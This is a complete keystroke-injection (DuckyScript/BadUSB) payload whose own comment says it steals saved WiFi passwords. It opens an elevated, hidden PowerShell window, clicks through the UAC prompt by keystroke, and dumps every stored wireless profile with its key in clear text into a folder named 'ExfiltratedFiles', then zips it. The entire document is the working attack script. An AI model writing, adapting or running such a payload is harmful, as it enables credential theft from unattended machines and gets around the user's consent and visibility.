REM Description: Steals all of the saved Wifi Passwords and stores them into a file.

DELAY 500
WINDOWS d
DELAY 500
WINDOWS r
DELAY 500
STRING powershell Start-Process powershell -Verb runAs -WindowStyle Hidden
ENTER
DELAY 800
LEFTARROW
ENTER
DELAY 800
ALT y
DELAY 500
GUI UP
DELAY 600
STRING $folderDateTime = (get-date).ToString('d-M-y HHmmss');$userDir = 'C:\ExfiltratedFiles';$fileSaveDir = New-Item  ($userDir) -ItemType Directory;$date = get-date;netsh wlan export profile key=clear folder=$fileSaveDir;Compress-Archive -Path $fileSaveDir -DestinationPath C:\ExfiltratedFiles\ResultsPassword.zip ; exit 
ENTER
